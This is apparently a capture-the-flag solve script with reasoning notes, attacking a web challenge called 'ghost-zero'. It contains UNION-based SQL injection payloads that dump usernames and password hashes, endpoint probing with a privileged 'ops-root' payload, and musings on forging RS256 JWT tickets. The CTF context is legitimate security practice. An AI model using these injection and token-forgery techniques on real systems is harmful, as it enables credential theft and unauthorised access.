"""
The endpoint /ddddddtestStat in the ghost-zero pcap is suspicious.
- 'dddddd' = 6 chars of 'd' = could be a redacted/masked string
- Maybe the real endpoint name is hidden in the pcap at a different layer
- Or maybe the server actually serves this endpoint internally

Let's check the raw pcap bytes more carefully.
Also let's try to use the fact that we have the RSA PUBLIC key
to FORGE a valid RS256 JWT ticket IF we can somehow get the private key.

Actually - wait. Let me re-read the pcap more carefully.
The internal service URL is: http://legacy-api.internal:8080/ddddddtestStat
This might be a completely separate internal service.

But /api/auth/exchange IS available on our target. 
We just need a validly-signed ticket JWT.

The ticket JWT uses kid=legacy-rs256-retired with RS256.
We confirmed the server still accepts this kid (it verifies signature, 
doesn't say "kid not found").

So the ONLY way to forge is to get the RSA PRIVATE key.
Unless... we check if there are multiple RSA key pairs and the 
'legacy-rs256-retired' key is different from 'primary-rs256'.

Let me check: do the guest tokens use 'primary-rs256' kid?
And does the server use a DIFFERENT (possibly weaker) key for 
'legacy-rs256-retired'?
"""
import requests
import base64
import json

BASE = "https://rsnfg2lzhxprnrolji5kuaicz3e.cloud.d3c.tf"

# Get a guest token and check its kid
r = requests.post(f"{BASE}/api/session/guest", headers={"Accept": "application/json"})
token = r.json()["token"]
parts = token.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

print(f"Guest token header: {json.dumps(header)}")
print(f"Guest token payload: {json.dumps(payload)}")
print(f"Guest token kid: {header.get('kid')}")

# The guest tokens use 'primary-rs256'
# The pcap tickets use 'legacy-rs256-retired'
# These might be TWO DIFFERENT RSA key pairs!
# Our recovered public key is for 'primary-rs256'.
# The 'legacy-rs256-retired' key might be WEAKER!

# We can't easily recover the legacy key because we have no signatures
# made with it (the pcap sig is fake 'expired-test-capture-signature').

# BUT - maybe the server uses the SAME key for both kids?
# Let's test: sign a ticket with the recovered primary key
# but set kid=legacy-rs256-retired

# Actually, let's think differently.
# The /api/auth/exchange endpoint accepts a ticket JWT.
# When we send kid=legacy-rs256-retired, it says "signature verification failed"
# When we send kid=primary-rs256, it ALSO says "signature verification failed"
# Both errors are the same, meaning both kid values are valid key IDs.

# What if we could use SQLi to somehow execute an INSERT/UPDATE
# on the server's key store? Probably not, the keys are likely
# in memory or environment vars, not SQLite.

# NEW IDEA: Check if the pcap endpoint names give us a clue
# "ddddddtestStat" - could "dddddd" be hex for some bytes?
hex_test = bytes.fromhex("dddddd")
print(f"\nhex 'dddddd' = {hex_test}")  # ÝÝÝ - not useful

# Maybe it's a base64url segment?
# Or maybe the full path is the key
# /ddddddtestStat could be an obfuscated name for /api/test/stat
# or similar internal debug endpoint

# Try internal endpoints with various prefixes
print("\n=== Trying internal-style endpoints ===")
endpoints = [
    "/ddddddtestStat",
    "/api/ddddddtestStat", 
    "/internal/testStat",
    "/api/internal/testStat",
    "/debug/testStat",
    "/api/debug/testStat",
    "/_internal/testStat",
    "/api/_internal/testStat",
    "/api/v1/testStat",
    "/api/legacy/testStat",
    # Try with the exact same payload
]

payload_data = {"principal": "ops-root", "mode": "bootstrap", "credentialType": "temporary"}
for ep in endpoints:
    r = requests.post(f"{BASE}{ep}", json=payload_data, 
                      headers={"Content-Type": "application/json"})
    if r.status_code != 404:
        print(f"  {ep}: {r.status_code} {r.text[:200]}")

# Maybe the answer is simpler - use SQLi to read the actual flag file
# via a creative approach. What if the flag is stored as a value
# we haven't looked at yet?

# Let's check ALL data in User table including the hash field
# Maybe the hashes are actually flag parts?
from client import GhostClient
c = GhostClient()
c.bootstrap()

print("\n=== Dumping ALL User data ===")
res = c.request("search", {"q": "' UNION SELECT id, username || ':' || hash, length(hash) FROM User ORDER BY username--"})
if res.get("ok"):
    rows = [r for r in res["data"]["rows"] if isinstance(r["summary"], (int, float))]
    for r in res["data"]["rows"]:
        try:
            if int(r["summary"]):
                pass
        except:
            continue
        print(f"  {r['title']:40s} hash_len={r['summary']}")

# Concatenate all hashes
res = c.request("search", {"q": "' UNION SELECT 1, group_concat(hash, '') , 'hashes' FROM User ORDER BY username--"})
if res.get("ok"):
    rows = [r for r in res["data"]["rows"] if r["id"] == 1 and r["summary"] == "hashes"]
    if rows:
        all_hashes = rows[0]["title"]
        print(f"\nAll hashes concatenated: {all_hashes}")
        try:
            decoded = base64.b64decode(all_hashes).hex()
            print(f"Decoded hex: {decoded[:100]}...")
        except:
            pass
